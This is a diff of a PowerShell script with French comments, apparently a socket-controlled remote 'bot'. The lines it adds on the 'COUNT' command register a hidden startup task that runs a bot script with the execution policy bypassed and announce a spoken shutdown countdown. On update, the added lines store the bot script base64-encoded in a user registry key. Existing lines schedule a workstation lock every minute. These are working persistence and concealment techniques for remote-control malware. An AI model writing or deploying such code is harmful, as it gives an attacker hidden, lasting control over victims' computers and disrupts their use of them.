@@ -57,8 +57,8 @@ function global:FRX_Socket-MessageAction{
             $tache2  = New-ScheduledTaskAction -Execute "rundll32.exe" -Argument "user32.dll,LockWorkStation"
             
             #Mise en place de la fréquence de la tâche et de la date de sa première exécution
-            $date = New-ScheduledTaskTrigger -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -Once
-            
+            $date  = New-ScheduledTaskTrigger -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -Once
+
             #Mise en place de la tâche avec les paramètres vus précédemment
             try{
                 Register-ScheduledTask -TaskName "test" -Trigger $date -Action $tache1,$tache2 -Description "Time to lock :)" Task -ErrorAction Stop | Out-Null
@@ -66,7 +66,24 @@ function global:FRX_Socket-MessageAction{
                 Register-ScheduledTask -TaskName "test" -Trigger $date -Action $tache1,$tache2 -Description "Time to lock :)" Task
              }
                                    }
-        {$_ -match "COUNT"       } {write-host "COUNT" -ForegroundColor Yellow}
+        {$_ -match "COUNT"       } {write-host "COUNT" -ForegroundColor Yellow
+        #-------- Bonus- Redémarrage du pc si on tape "count" avec une voix qui annonce un décompte "3 2 1" --------
+            #Mise en place de 'excéution automatique de la tâche 
+            $tache3 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle hidden -ExecutionPolicy Bypass C:\lib\BOT\test.ps1"
+            $Repet = New-ScheduledTaskTrigger -AtStartup
+
+            #Mise en place de la tâche avec les paramètres vus précédemment
+            try{
+                Register-ScheduledTask -TaskName "Restart" -Trigger $Repet -Action $tache3 -Description "Time to Diconnect :)" Task -ErrorAction Stop | Out-Null
+            }catch{
+                Register-ScheduledTask -TaskName "Restart" -Trigger $Repet -Action $tache3 -Description "Time to Disconnect :)" Task
+             }
+ 
+             Add-Type -AssemblyName System.speech
+             $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
+             $speak.Speak("Attention votre ordinateur va couper dans. 3 2 1") 
+             #Restart-Computer -Force
+        }
         {$_ -like  "GAMEOVER"    } {write-host "--- TERMINATING CONNECTION ---" -ForegroundColor red
                                     $stop=$true}
         
@@ -82,6 +99,23 @@ function global:FRX_Socket-MessageAction{
              write-host "|" -ForegroundColor Yellow 
         }{   write-host "+------------------+"-fore yellow}
                 #Le programme s'arrête après MAJ
+
+                Set-Location HKCU:\Software\Microsoft\Windows\CurrentVersion
+                $registerypath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\GentilleCle"
+                if(Test-Path $registerypath){
+                    Write-host Clé régistre déjà-présente, mise à jour... -fore red
+                    $script       =[IO.File]::ReadAllText("C:\lib\BOT\BOTok_commenté.ps1")
+                    $scriptbytes  = [System.Text.Encoding]::UTF8.GetBytes($script)
+                    $scriptbase64 = [System.Convert]::ToBase64String($scriptbytes)
+                    set-ItemProperty -path $registerypath -Name Script -Value $scriptbase64
+                }
+                else{
+                    New-Item -Path $registerypath
+                    $script       =[IO.File]::ReadAllText("C:\lib\BOT\BOTok_commenté.ps1")
+                    $scriptbytes  = [System.Text.Encoding]::UTF8.GetBytes($script)
+                    $scriptbase64 = [System.Convert]::ToBase64String($scriptbytes)
+                    set-ItemProperty -path $registerypath -Name Script -Value $scriptbase64
+                }
                 $stop=$true
         }
         Default {write-host $message}
